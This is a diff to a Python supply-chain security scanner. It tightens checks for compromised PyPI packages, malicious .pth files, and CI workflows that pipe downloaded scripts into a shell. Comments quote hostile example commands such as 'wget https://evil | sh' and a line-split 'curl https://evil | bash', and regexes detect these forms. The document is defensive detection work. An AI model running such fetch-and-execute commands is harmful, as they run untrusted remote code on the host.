@@ -179,17 +179,28 @@ def check_compromised_pypi_in_deps(repo_root: Path) -> CheckResult:
     name = "Known-compromised PyPI packages in requirements files"
     hits: List[str] = []
     req_files = list(repo_root.rglob("requirements*.txt"))
-    # Filter out venvs + recovery dirs + node_modules (false positives).
+    # Filter out venvs + recovery dirs + node_modules + .git (false
+    # positives, plus the .git tree slows rglob substantially on big
+    # repos — Gemini medium on 3fe4154).
     # Match by exact directory-component name, NOT substring — otherwise
     # a legitimate project dir named `my-venv-project` or a file named
     # `requirements-dist.txt` would be silently excluded. (Gemini HIGH
     # on 9a20e14.)
+    # Use RELATIVE-TO-REPO parts so a parent directory of the repo
+    # named ``dist`` / ``venv`` (e.g. cloning into
+    # ``C:\dist\projects\…``) doesn't disable the scan for everything
+    # underneath. Gemini security-high on 3fe4154.
     exclude_dirs = {".venv", "venv", "site-packages", ".recovery",
-                    "node_modules", ".sandbox-venv", "dist"}
-    req_files = [
-        p for p in req_files
-        if not any(part in exclude_dirs for part in p.parts)
-    ]
+                    "node_modules", ".sandbox-venv", "dist", ".git"}
+
+    def _excluded(p: Path) -> bool:
+        try:
+            rel_parts = p.relative_to(repo_root).parts
+        except ValueError:
+            rel_parts = p.parts  # outside repo_root — fall back
+        return any(part in exclude_dirs for part in rel_parts)
+
+    req_files = [p for p in req_files if not _excluded(p)]
     for req in req_files:
         try:
             text = req.read_text(encoding="utf-8", errors="replace").lower()
@@ -250,7 +261,10 @@ def check_pth_files_for_exec_code(venv_paths: List[Path]) -> CheckResult:
         # (`site-packages/<pkg>/attack.pth`) would otherwise evade
         # the scanner. (Subagent HIGH on 4cc0bb4.)
         for pth in venv.rglob("*.pth"):
-            if "site-packages" not in str(pth):
+            # Case-fold via as_posix().lower() so a custom Python
+            # install with ``Site-Packages`` capitalisation still
+            # matches. Gemini medium on 3fe4154.
+            if "site-packages" not in pth.as_posix().lower():
                 continue
             scanned += 1
             # Allowlisted setuptools-shipped .pth files are skipped —
@@ -372,8 +386,14 @@ def check_workflows_for_suspicious_commits(repo_root: Path) -> CheckResult:
             r"(?:[\w/.+\-]+/)?(?:sudo(?:\s[^|\n]*?)?\s+)?(?:[\w/.+\-]+/)?"
             r"(sh|bash|zsh|python[\d.]*)\b"
         ),
+        # Broader wget detector — Codex P1 on 15bd7bb. Drop the
+        # ``-O-`` requirement: ``wget https://evil | sh`` is just as
+        # dangerous (wget writes to disk and a follow-up reads it,
+        # OR a redirect / process substitution wrapper feeds it
+        # through). The ``-O-`` / ``-qO-`` / ``--output-document=-``
+        # forms are all subsumed by the generic ``wget <args> |``.
         re.compile(
-            r"wget\s+[^|\n]+-O-\s*\|(?:\s*[^|\n]+\|)*\s*"
+            r"wget\s+[^|\n]+\|(?:\s*[^|\n]+\|)*\s*"
             r"(?:[\w/.+\-]+/)?(?:sudo(?:\s[^|\n]*?)?\s+)?(?:[\w/.+\-]+/)?"
             r"(sh|bash|zsh|python[\d.]*)\b"
         ),
@@ -397,8 +417,19 @@ def check_workflows_for_suspicious_commits(repo_root: Path) -> CheckResult:
             text = wf.read_text(encoding="utf-8", errors="replace")
         except OSError:
             continue
+        # Collapse POSIX shell line-continuations (``\<newline>``)
+        # before scanning. A common evasion is to wrap the payload
+        # across lines:
+        #     run: |
+        #       curl https://evil \
+        #         | bash
+        # The existing patterns are line-bound (``[^|\n]+``) and miss
+        # this. Joining the continuation with a single space restores
+        # the logical line so the patterns match. Codex P1 on
+        # 15bd7bb.
+        text_for_scan = re.sub(r"\\\r?\n\s*", " ", text)
         for pat in bad_patterns:
-            m = pat.search(text)
+            m = pat.search(text_for_scan)
             if m:
                 hits.append(f"{wf.name}: matches {pat.pattern!r}: {m.group(0)[:80]}")
     if hits:
